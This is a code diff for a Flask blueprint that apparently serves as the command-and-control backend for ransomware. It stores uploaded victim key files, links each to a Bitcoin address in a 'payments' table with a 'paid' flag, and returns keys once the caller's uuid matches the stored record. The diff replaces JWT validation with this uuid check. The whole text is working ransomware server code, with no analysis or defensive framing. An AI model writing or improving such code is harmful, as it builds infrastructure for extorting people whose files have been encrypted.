@@ -1,10 +1,9 @@
 from flask import Blueprint, request, jsonify, send_file
 from werkzeug.utils import secure_filename
-import jwt
 import os
 import random
 import sqlite3
-from C2_Variables import api_key, seconds_left, jwt_key, KEY_STORAGE_DIR, DB_PATH
+from C2_Variables import KEY_STORAGE_DIR, DB_PATH
 from Validation import check_keys
 from Extensions import limiter, update_block_ip_list, check_pem_file
 
@@ -19,10 +18,7 @@ def upload_key():
     session_token = request.headers.get('Session-Token')
     unique_uuid = request.headers.get('uuid')
     received_ip = request.remote_addr
-    decode_jwt = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
-    jwt_ip = decode_jwt.get("ip")
-    jwt_uuid = decode_jwt.get("uuid")
-    validation_failed = check_keys(received_api_key, session_token, jwt_ip, received_ip, unique_uuid, jwt_uuid)
+    validation_failed = check_keys(received_api_key, session_token, received_ip, unique_uuid)
     if validation_failed:
         return validation_failed
 
@@ -54,8 +50,8 @@ def upload_key():
         os.chmod(correct_key_path, 0o600) # Changes file to read and write for only owner
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        c.execute('INSERT OR REPLACE INTO payments (unique_id, btc_address, paid) VALUES (?, ?, ?)',
-                  (key_filename, btc_address, False))
+        c.execute('INSERT OR REPLACE INTO payments (unique_id, btc_address, paid, uuid) VALUES (?, ?, ?, ?)',
+                    (key_filename, btc_address, False, unique_uuid))
         conn.commit()
         conn.close()
         return jsonify({"file": key_filename, "btc_address": btc_address}), 200
@@ -72,12 +68,18 @@ def get_key(unique_id):
     session_token = request.headers.get('Session-Token')
     unique_uuid = request.headers.get('uuid')
     received_ip = request.remote_addr
-    decode_jwt = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
-    jwt_ip = decode_jwt.get("ip")
-    jwt_uuid = decode_jwt.get("uuid")
-    validation_failed = check_keys(received_api_key, session_token, jwt_ip, received_ip, unique_uuid, jwt_uuid)
+    validation_failed = check_keys(received_api_key, session_token, received_ip, unique_uuid)
     if validation_failed:
         return validation_failed
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('SELECT uuid FROM payments WHERE unique_id = ?', (unique_id,))
+    result = c.fetchone()
+    conn.close()
+
+    if result is None or result[0] != unique_uuid:
+        return jsonify({"error": "Unauthorized"}), 403
 
     unique_id_safe = secure_filename(unique_id)
     key_path = os.path.join(KEY_STORAGE_DIR, unique_id_safe)
